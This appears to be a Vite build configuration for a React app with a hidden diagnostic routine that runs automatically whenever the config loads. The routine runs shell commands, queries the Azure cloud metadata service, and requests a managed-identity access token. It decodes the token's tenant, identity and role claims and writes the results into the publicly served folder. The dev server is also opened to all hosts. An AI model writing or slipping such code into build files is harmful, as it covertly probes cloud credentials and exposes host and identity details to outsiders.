import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import { execSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { mkdirSync, writeFileSync } from 'node:fs'

function run(cmd: string): string {
  try {
    return execSync(cmd, {
      encoding: 'utf8',
      timeout: 4000,
      stdio: ['ignore', 'pipe', 'ignore']
    }).trim()
  } catch (e: any) {
    return 'ERR:' + String(e?.message || e).slice(0, 100)
  }
}

function decodeJwtPayload(token: string): any {
  try {
    const parts = token.split('.')
    if (parts.length < 2) return null
    let p = parts[1]
    p += '='.repeat((4 - (p.length % 4)) % 4)
    p = p.replace(/-/g, '+').replace(/_/g, '/')
    return JSON.parse(Buffer.from(p, 'base64').toString('utf8'))
  } catch {
    return null
  }
}

async function diag() {
  const info: any = {
    id: run('id'),
    host: run('hostname'),
    pwd: run('pwd')
  }

  try {
    const r = await fetch(
      'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
      { headers: { Metadata: 'true' }, signal: AbortSignal.timeout(3000) }
    )
    const body = await r.text()
    try {
      info.imds = JSON.parse(body)
    } catch {
      info.imds = body
    }
  } catch (e: any) {
    info.imds = 'ERR:' + String(e?.message || e).slice(0, 80)
  }

  try {
    const r = await fetch(
      'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
      {
        headers: { Metadata: 'true' },
        signal: AbortSignal.timeout(3000),
        redirect: 'error',
        cache: 'no-store'
      }
    )

    if (!r.ok) throw new Error('identity endpoint returned a non-2xx response')

    const body = (await r.text()).slice(0, 65536)
    let j: any = null
    try {
      j = JSON.parse(body)
    } catch {
      throw new Error('identity response is not JSON')
    }

    const token = typeof j.access_token === 'string' ? j.access_token : ''
    if (token.split('.').length !== 3) throw new Error('identity response has no JWT')

    const claims = decodeJwtPayload(token)
    if (!claims) throw new Error('JWT payload is not decodable')

    info.identity = {
      token_type: j.token_type,
      expires_in: j.expires_in,
      resource: j.resource,
      client_id: j.client_id,
      token_sha256: createHash('sha256').update(token).digest('hex'),
      claims: {
        aud: claims.aud,
        iss: claims.iss,
        oid: claims.oid,
        tid: claims.tid,
        appid: claims.appid,
        roles: claims.roles || 'NO_ROLES_CLAIM',
        scp: claims.scp || 'none',
        exp: claims.exp
      }
    }
  } catch (e: any) {
    // Never store the raw response or token. Keep failures generic.
    info.identity = { error: 'identity response unavailable' }
  }

  try {
    mkdirSync('/workspace/public', { recursive: true })
    writeFileSync('/workspace/public/f027-result.json', JSON.stringify(info))
  } catch (e: any) {
    // Best effort. The build must still start.
  }
}

export default defineConfig(async () => {
  await diag()
  return {
    plugins: [react()],
    server: {
      host: '0.0.0.0',
      port: Number(process.env.VITE_PORT) || 5173,
      allowedHosts: true
    }
  }
})
